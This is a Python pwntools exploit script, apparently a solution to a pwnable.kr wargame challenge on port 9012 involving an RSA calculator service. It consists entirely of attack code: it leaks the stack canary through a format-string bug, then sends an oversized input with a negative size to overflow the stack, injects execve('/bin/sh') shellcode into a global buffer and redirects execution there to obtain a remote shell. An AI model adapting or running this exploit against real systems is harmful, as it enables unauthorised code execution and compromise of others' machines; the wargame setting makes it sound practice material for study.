from pwn import *
import binascii

context.arch = 'amd64'

###Util
def set_key(p,q,e,d):
    r.sendlineafter('> ','1')
    r.sendlineafter('p : ',str(p))
    r.sendlineafter('q : ',str(q))
    r.sendlineafter('e : ',str(e))
    r.sendlineafter('d : ',str(d))

def decrypt(size,data):
    r.sendlineafter('> ','3')
    r.sendlineafter(' : ',str(size))
    r.sendlineafter('data\n',data)
    r.recvuntil('-\n')
    return r.recvline()[:-1]

###Addr
system_plt = 0x4007c0
g_ebuf = 0x6020e0

###Exploit
r = remote('pwnable.kr',9012)

set_key(256,1,1,1)
canary = int(decrypt(0x400,binascii.hexlify(b'%\x00\x00\x002\x00\x00\x000\x00\x00\x005\x00\x00\x00$\x00\x00\x00p\x00\x00\x00'))[2:],16)

shellcode = asm(f'''
                 mov rax, 0x3b
                 mov rdi, {g_ebuf}
                 mov rsi, 0
                 mov rdx, 0
                 syscall
                 ''')
decrypt(-1,binascii.hexlify(b'/bin/sh\x00'+shellcode).ljust(0x608,b'\x00')+p64(canary)+p64(0)+p64(g_ebuf+0x8))

r.interactive()
